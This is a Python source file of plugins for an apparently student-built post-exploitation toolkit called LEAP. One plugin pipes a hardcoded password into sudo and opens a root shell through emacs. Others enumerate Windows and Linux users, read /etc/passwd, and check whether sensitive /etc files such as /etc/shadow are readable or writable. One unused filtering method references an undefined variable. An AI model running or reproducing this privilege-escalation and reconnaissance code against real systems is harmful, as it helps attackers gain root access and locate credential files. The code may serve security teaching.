'''LEAP plugins created by Max Sharp (10155248) '''

from person_D.plugins3 import PrivEsc_D, Enumeration_D, Item
import os
import subprocess
import pty
from consolemenu import Screen

class EmacsPrivEsc(PrivEsc_D):
    def __init__(self):
        PrivEsc_D.__init__(self, "EmacsPrivEsc", "Max Sharp", "Utilise emacs vulnerability to execute commands as root", None)

    def getInfo(self):
        return EmacsPrivEsc.info1() 

    def run(self):
        print("==== EMACS PRIVLEGE ESCALATION ====")
        print(f"\n  Information: {EmacsPrivEsc.info1(self)}\n")
        input("ENTER to run privilege escalation...")
        os.system("sudo -k")
        os.system("echo swordfish | sudo -S sudo")
        os.system("""sudo emacs -Q -nw --eval '(term "/bin/sh")'""")

class ListUsersWindows(Enumeration_D):
    def __init__(self):
        Enumeration_D.__init__(self, "ListUsersWindows", "Max Sharp", "List the users on a Windows machine", None)

    def displayUsers(self, users):
        print(f"""\n\n==== USERS ENUMERATION (WINDOWS) ====
                
    Information: {ListUsersWindows.info1(self)}
                """)
        for u in users:
            print(u)

    def run(self):
        usersOutput = subprocess.getoutput("net users")
        users=usersOutput.split("\n")
        counter = 0
        while(counter < 4):
            users.pop(0)
            counter = counter + 1
        counter = - 2
        while(counter < 0):
            users.pop(-1)
            counter = counter + 1
        ListUsersWindows.displayUsers(self, users)        
        return None

class ListUsers(Enumeration_D):
    def __init__(self):
        Enumeration_D.__init__(self, "ListUsers", "Max Sharp", "List the users on a Linux machine", None)

    def returnEtcPasswd(self):
        output = subprocess.getoutput("cat /etc/passwd")
        return output

    def etcPasswdToList(self, etcPasswdList):
        etcPasswdAccounts = list(etcPasswdList.split("\n"))
        users = []
        for user in etcPasswdAccounts:
            accountName=user.split(":")
            users.append(accountName[0])
        return users

    def displayUsers(self, users):
        print(f"""\n\n==== USERS ENUMERATION (LINUX) ====
                
    Information: {ListUsers.info1(self)}
                """)
        for u in users:
            print(u)

    def run(self):
        etcPassword = ListUsers.returnEtcPasswd(self)
        ListUsers.displayUsers(self, ListUsers.etcPasswdToList(self, etcPassword))
        Screen().input("press any key to continue")
        return None

class EtcEnum(Enumeration_D): #Did have Enumeration as a parameter

    def __init__(self):
        Enumeration_D.__init__(self, "EtcEnum", "Max Sharp", "Find files of interest in /etc/", None)

    def printer(self, string):
        return string

    def returnReadableAndWritableFilesInEtc(self, flag):
        command = "find /etc/ -maxdepth 1 " + flag
        output = subprocess.getoutput(command)
        filesList = list(output.split("\n"))
        return filesList

    def filterEtcFilesOfInterest(self, unfilteredFiles):
        filesOfInterestList=["/etc/rc", "/etc/rd.d", "/etc/rd?.d", "/etc/passwd", "/etc/shadow", "/etc/fdprm", "/etc/fstab", "/etc/group" , "/etc/inittab", "/etc/issue", "/etc/issue", "/etc/magic" , "/etc/motd", "/etc/login.defs", "/etc/printcap", "/etc/profile", "/etc/bash.rc", "/etc/csh.cshrc", "/etc/securetty", "/etc/shells", "/etc/termcap"]
        filteredFiles = []
        for f in unfilteredFile:
            if(f in filesOfInterestList):
                filteredFiles.append(f)
        return filteredFiles
        

    def formatOutput(self, readableList, writableList):
        formattedList = []
        for f in readableList:
            if(f in writableList):
                formattedList.append("RW    "+f)
            else:
                formattedList.append("R     "+f)
        for f in writableList:
            if not(f in readableList):
                formattedList.append("W     "+f)
        return formattedList

    def displayList(self, formattedList):
        print(f"""==== /ETC/ ENUMERATION ====
    
    Information: {EtcEnum.info1(self)}

    R   = (R)eadable with current user privileges
    W   = (W)ritable with current user privileges
    RW  = Readable and writable with current user privileges
        
        """)
        for f in formattedList:
            print(f)

    def returnFilesOfInterest(self, files):
        filesOfInterest = []
        filesIFindInterestingList=["/etc/rc", "/etc/rd.d", "/etc/rd?.d", "/etc/passwd", "/etc/shadow", "/etc/fdprm", "/etc/fstab", "/etc/group" , "/etc/inittab", "/etc/issue", "/etc/issue", "/etc/magic" , "/etc/motd", "/etc/login.defs", "/etc/printcap", "/etc/profile", "/etc/bash.rc", "/etc/csh.cshrc", "/etc/securetty", "/etc/shells", "/etc/termcap"]
        for f in files:
            if(f in filesIFindInterestingList):
                filesOfInterest.append(f)
        return filesOfInterest

    def run(self):
        readableFilesList = EtcEnum.returnReadableAndWritableFilesInEtc(self, "-readable")
        writableFilesList = EtcEnum.returnReadableAndWritableFilesInEtc(self, "-writable")
        readableFilesList = EtcEnum.returnFilesOfInterest(self, readableFilesList)
        writableFilesList = EtcEnum.returnFilesOfInterest(self, writableFilesList)
        formattedList = EtcEnum.formatOutput(self, readableFilesList, writableFilesList)
        EtcEnum.displayList(self, formattedList)
        Screen().input("press any key to continue")
        return None



